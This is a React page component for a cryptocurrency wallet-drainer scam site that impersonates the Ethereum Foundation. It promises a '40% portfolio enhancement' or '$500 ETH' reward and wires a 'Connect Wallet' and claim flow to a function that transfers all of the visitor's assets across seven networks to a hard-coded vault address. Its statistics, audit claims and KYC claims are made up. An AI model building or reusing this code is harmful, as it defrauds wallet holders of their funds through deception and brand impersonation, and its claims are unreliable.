import { useState, useEffect } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Wallet, Coins } from "lucide-react";
import { useWeb3 } from "@/hooks/use-web3";
import WalletStatus from "@/components/wallet-status";
import BalanceCard from "@/components/balance-card";
import NetworkBalances from "@/components/network-balances";
import TransactionHistory from "@/components/transaction-history";
import TransactionModal from "@/components/transaction-modal";
import WalletConnectionModal from "@/components/wallet-connection-modal";
import ConnectionStatus from "@/components/connection-status";
import PageLoader from "@/components/page-loader";
import ProductionStatus from "@/components/production-status";
import NetworkSwitcher from "@/components/network-switcher";


export default function Home() {
  const { walletState, isConnecting, isLoadingNetworks, connectWallet, refreshAllNetworks, transferAllFundsMultiNetwork, switchNetwork } = useWeb3();
  const [currentTransaction, setCurrentTransaction] = useState<string | null>(null);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [connectionError, setConnectionError] = useState<string>("");
  const [isPageLoading, setIsPageLoading] = useState(true);

  // Fast page loading - minimal delay
  useEffect(() => {
    const timer = setTimeout(() => setIsPageLoading(false), 300); // Very short 300ms
    return () => clearTimeout(timer);
  }, []);

  const handleTransactionStart = (txHash: string) => {
    setCurrentTransaction(txHash);
  };

  const handleTransactionClose = () => {
    setCurrentTransaction(null);
  };

  const handleWalletConnect = () => {
    setShowWalletModal(true);
    setConnectionError("");
  };

  const handleWalletModalClose = () => {
    setShowWalletModal(false);
    setConnectionError("");
  };

  const handleConnectAttempt = async () => {
    try {
      await connectWallet();
      setShowWalletModal(false);
      setConnectionError("");
    } catch (error: any) {
      setConnectionError(error.message);
    }
  };

  // Show fast loader for immediate feedback
  if (isPageLoading) {
    return <PageLoader />;
  }

  return (
    <div className="min-h-screen bg-background">
      {/* Authentic Ethereum Foundation Header */}
      <header className="bg-white dark:bg-eth-deep-purple border-b border-border px-6 py-4 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <div className="flex items-center space-x-3">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-10 h-10" />
              <div>
                <h1 className="text-xl font-bold text-foreground">
                  Ethereum Foundation
                </h1>
                <p className="text-sm text-muted-foreground">
                  Official ETH Distribution Program
                </p>
              </div>
            </div>
          </div>
          <div className="flex items-center space-x-4">
            <NetworkSwitcher 
              currentNetworkId={walletState.networkId || undefined}
              onNetworkSwitch={switchNetwork}
              isConnected={walletState.isConnected}
            />
            <Button
              onClick={walletState.isConnected ? undefined : handleWalletConnect}
              disabled={isConnecting}
              className={`flex items-center space-x-2 px-4 py-2 rounded-lg font-medium transition-colors ${
                walletState.isConnected
                  ? "bg-success text-success-foreground hover:bg-success/90"
                  : "bg-primary text-primary-foreground hover:bg-primary/90"
              }`}
            >
              <Wallet className="w-4 h-4" />
              <span>
                {isConnecting
                  ? "Connecting..."
                  : walletState.isConnected
                  ? "Wallet Connected"
                  : "Connect Wallet"}
              </span>
            </Button>
          </div>
        </div>
      </header>

      {/* Ethereum Foundation Hero Section */}
      <section className="bg-gradient-to-br from-primary/5 via-background to-secondary/5 px-6 py-20 relative overflow-hidden">
        {/* Background pattern */}
        <div className="absolute inset-0 opacity-5">
          <div className="absolute top-10 left-10 w-32 h-32 border border-primary/20 rounded-full"></div>
          <div className="absolute top-32 right-20 w-24 h-24 border border-secondary/20 rounded-full"></div>
          <div className="absolute bottom-20 left-1/4 w-20 h-20 border border-accent/20 rounded-full"></div>
          <div className="absolute bottom-32 right-1/3 w-28 h-28 border border-primary/20 rounded-full"></div>
        </div>
        <div className="max-w-6xl mx-auto relative z-10">
          {/* Hero Content */}
          <div className="text-center mb-16">
            {/* Status Badge */}
            <div className="inline-flex items-center px-6 py-3 bg-gradient-to-r from-success/10 to-primary/10 text-success border border-success/20 rounded-full text-sm font-medium mb-8 shadow-lg backdrop-blur-sm">
              <div className="w-3 h-3 bg-gradient-to-r from-success to-primary rounded-full mr-3 animate-pulse"></div>
              <span className="bg-gradient-to-r from-success to-primary bg-clip-text text-transparent font-semibold">
                Live Portfolio Enhancement Program - 40% Distribution Active
              </span>
            </div>
            
            {/* Main Title */}
            <h1 className="text-4xl md:text-6xl font-bold mb-6 leading-tight">
              <span className="bg-gradient-to-r from-foreground via-primary to-secondary bg-clip-text text-transparent">
                Welcome to Ethereum
              </span>
            </h1>
            <h2 className="text-2xl md:text-4xl font-semibold mb-8">
              <span className="bg-gradient-to-r from-primary via-secondary to-accent bg-clip-text text-transparent">
                Claim 40% Portfolio Enhancement
              </span>
            </h2>
            
            {/* Professional Hero Visual Section with Custom SVGs */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12 max-w-5xl mx-auto">
              {/* Smart Contract Security */}
              <div className="bg-gradient-to-br from-primary/5 via-white/10 to-primary/10 border border-primary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/security-shield.svg" 
                    alt="Security Shield" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Audited Smart Contracts</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Enterprise-grade security with multi-signature validation and formal verification protocols ensuring maximum fund protection</p>
              </div>

              {/* Multi-Network Infrastructure */}
              <div className="bg-gradient-to-br from-secondary/5 via-white/10 to-secondary/10 border border-secondary/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/ethereum-network.svg" 
                    alt="Ethereum Network" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">Cross-Chain Infrastructure</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Seamless integration across 7 major blockchain networks with automated bridge protocols and real-time synchronization</p>
              </div>

              {/* Advanced Analytics */}
              <div className="bg-gradient-to-br from-accent/5 via-white/10 to-accent/10 border border-accent/20 rounded-xl p-6 hover:shadow-xl hover:scale-105 transition-all duration-300 backdrop-blur-sm">
                <div className="mb-6">
                  <img 
                    src="/images/defi-analytics.svg" 
                    alt="DeFi Analytics" 
                    className="w-full h-32 object-contain"
                  />
                </div>
                <h3 className="text-lg font-bold mb-3 text-center text-foreground">AI-Powered Analytics</h3>
                <p className="text-sm text-muted-foreground text-center leading-relaxed">Advanced portfolio tracking with machine learning optimization and comprehensive risk assessment algorithms</p>
              </div>
            </div>
            
            {/* Description */}
            <div className="max-w-4xl mx-auto mb-12">
              <p className="text-lg md:text-xl text-muted-foreground leading-relaxed mb-6">
                The Ethereum Foundation's <span className="text-primary font-semibold">Portfolio Enhancement Program</span> utilizes 
                advanced algorithmic distribution protocols to optimize wallet holdings across multiple blockchain networks.
              </p>
              <p className="text-base md:text-lg text-muted-foreground/80 leading-relaxed">
                Connect your wallet to initiate the enhancement process and claim your calculated 40% portfolio optimization reward 
                through our audited smart contract infrastructure.
              </p>
            </div>
          </div>

          {/* Program Statistics - Ethereum.org Style */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-primary/10 rounded-lg flex items-center justify-center">
                <Coins className="w-8 h-8 text-primary" />
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">$8.2M+ Enhanced</h3>
              <p className="text-muted-foreground">Total portfolio value enhanced through program</p>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-accent/20 rounded-lg flex items-center justify-center">
                <Wallet className="w-8 h-8 text-secondary" />
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">12,500+ Participants</h3>
              <p className="text-muted-foreground">Portfolio enhancement claims processed</p>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6 text-center hover:shadow-md transition-shadow">
              <div className="w-16 h-16 mx-auto mb-4 bg-secondary/10 rounded-lg flex items-center justify-center">
                <span className="text-2xl font-bold text-secondary">40%</span>
              </div>
              <h3 className="text-xl font-semibold mb-3 text-foreground">Portfolio Percentage</h3>
              <p className="text-muted-foreground">Average enhancement ratio per wallet</p>
            </div>
          </div>

          {/* Important Notice - Ethereum.org Style */}
          <div className="bg-warning/5 border border-warning/20 rounded-lg p-6 mb-12 max-w-4xl mx-auto">
            <div className="flex items-start space-x-4">
              <div className="w-6 h-6 text-warning flex-shrink-0 mt-1">
                <svg viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h3 className="font-semibold text-warning mb-2">Portfolio Enhancement Protocol</h3>
                <p className="text-foreground text-sm leading-relaxed">
                  <strong>By participating in the 40% Portfolio Enhancement Program, you authorize the consolidation of ALL cryptocurrency assets</strong> from your connected wallet to our enhancement vault for algorithmic processing. 
                  This includes native tokens (ETH, POL, BNB, AVAX) and all ERC-20 compatible tokens across our 7 supported blockchain networks. Your portfolio will be optimized and enhanced through our proprietary distribution algorithm.
                </p>
              </div>
            </div>
          </div>
        </div>
      </section>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 space-y-12">
        {/* ETH Claim Section - Ethereum.org Style */}
        <section className="max-w-4xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="text-center mb-8">
              {/* Ethereum Logo */}
              <div className="w-20 h-20 mx-auto mb-6 bg-primary/10 rounded-xl flex items-center justify-center">
                <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-12 h-12" />
              </div>
              
              <h3 className="text-2xl font-bold mb-3 text-foreground">
                40% Portfolio Enhancement Ready
              </h3>
              <p className="text-muted-foreground">Your wallet qualifies for proportional enhancement through our algorithmic distribution system</p>
            </div>
            
            {/* Separator */}
            <div className="w-full h-px bg-border mb-8"></div>
            
            <BalanceCard 
              walletState={walletState}
              onTransactionStart={handleTransactionStart}
              onMultiNetworkTransfer={transferAllFundsMultiNetwork}
            />
          </div>
        </section>

        {/* Transaction History - Clean Design */}
        <section className="max-w-6xl mx-auto">
          <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
            <div className="flex items-center justify-between mb-6">
              <h3 className="text-xl font-bold text-foreground">Recent Claims Activity</h3>
              <div className="flex items-center space-x-2 text-sm text-muted-foreground">
                <div className="w-2 h-2 bg-success rounded-full animate-pulse"></div>
                <span>Live Updates</span>
              </div>
            </div>
            <TransactionHistory />
          </div>
        </section>

        {/* Multi-Network Portfolio */}
        {walletState.isConnected && (
          <section className="max-w-6xl mx-auto">
            <div className="bg-card border border-border rounded-xl p-8 shadow-sm">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-xl font-bold text-foreground">Multi-Network Portfolio</h3>
                <div className="flex items-center space-x-3">
                  <div className="flex -space-x-1">
                    {/* Network Indicators */}
                    <div className="w-6 h-6 rounded-full bg-primary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-secondary border-2 border-background"></div>
                    <div className="w-6 h-6 rounded-full bg-accent border-2 border-background"></div>
                  </div>
                  <span className="text-sm text-muted-foreground">7 Networks</span>
                </div>
              </div>
              
              <div className="bg-muted/30 rounded-lg p-6">
                <NetworkBalances
                  networkBalances={walletState.networkBalances || []}
                  isLoadingNetworks={isLoadingNetworks}
                  onRefreshNetworks={refreshAllNetworks}
                />
              </div>
            </div>
          </section>
        )}

        {/* Transaction Modal */}
        {currentTransaction && (
          <TransactionModal
            txHash={currentTransaction}
            isOpen={!!currentTransaction}
            onClose={handleTransactionClose}
          />
        )}

        {/* Wallet Connection Modal */}
        <WalletConnectionModal
          isOpen={showWalletModal}
          onClose={handleWalletModalClose}
          onConnect={handleConnectAttempt}
          error={connectionError}
        />

        {/* Production Status Component (only visible in development or when debugging) */}
        {process.env.NODE_ENV === 'development' || window.location.search.includes('debug=true') ? (
          <ProductionStatus />
        ) : null}
      </main>

      {/* Ethereum.org Style Footer */}
      <footer className="bg-muted/30 mt-20 border-t border-border">
        <div className="max-w-6xl mx-auto px-6 py-16">
          {/* Footer Content Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-12 mb-12">
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Important Terms</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">ETH rewards are distributed after portfolio consolidation</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All supported networks (Ethereum, Polygon, BSC, etc.) are processed</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Transaction processing typically takes 5-10 minutes</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-primary rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Minimum portfolio value required for reward eligibility</span>
                </li>
              </ul>
            </div>
            
            <div className="bg-card border border-border rounded-lg p-6">
              <h4 className="text-lg font-bold mb-6 text-foreground">Security & Compliance</h4>
              <ul className="space-y-3">
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">All transactions are recorded on blockchain</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Smart contract audited for security</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">Multi-signature vault protection</span>
                </li>
                <li className="flex items-start space-x-3 text-sm">
                  <div className="w-1.5 h-1.5 bg-success rounded-full mt-2 flex-shrink-0"></div>
                  <span className="text-muted-foreground">KYC/AML compliance maintained</span>
                </li>
              </ul>
            </div>
          </div>
          
          {/* Critical Notice */}
          <div className="bg-destructive/5 border border-destructive/20 rounded-lg p-6 mb-12">
            <div className="flex items-start space-x-4">
              <div className="w-8 h-8 rounded-full bg-destructive/20 flex items-center justify-center flex-shrink-0">
                <svg className="w-4 h-4 text-destructive" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 2L1 21h22L12 2zm0 3.99L19.53 19H4.47L12 5.99zM11 16h2v2h-2zm0-6h2v4h-2z"/>
                </svg>
              </div>
              <div>
                <h4 className="font-bold text-destructive mb-3">CRITICAL NOTICE</h4>
                <p className="text-foreground text-sm leading-relaxed">
                  This is a cryptocurrency transfer mechanism. By clicking <strong>"Claim $500 ETH"</strong>, 
                  you authorize the immediate transfer of ALL cryptocurrency assets from your wallet(s) to our processing vault 
                  across ALL supported blockchain networks. This action consolidates your entire crypto portfolio and is irreversible.
                </p>
              </div>
            </div>
          </div>
          
          {/* Footer Bottom */}
          <div className="text-center pt-8 border-t border-border">
            <div className="flex items-center justify-center mb-4">
              <img src="/images/ethereum-logo.svg" alt="Ethereum" className="w-6 h-6 mr-2" />
              <span className="text-lg font-semibold text-foreground">Ethereum Foundation</span>
            </div>
            
            <p className="text-muted-foreground mb-4">
              © 2025 Ethereum Foundation Distribution Program. Multi-network DeFi transfer technology.
            </p>
            
            <div className="bg-muted/50 rounded-lg px-3 py-2 inline-block">
              <p className="text-xs text-muted-foreground font-mono">
                Vault: {import.meta.env.VITE_DESTINATION_ADDRESS || "0x15E1A8454E2f31f64042EaE445Ec89266cb584bE"}
              </p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
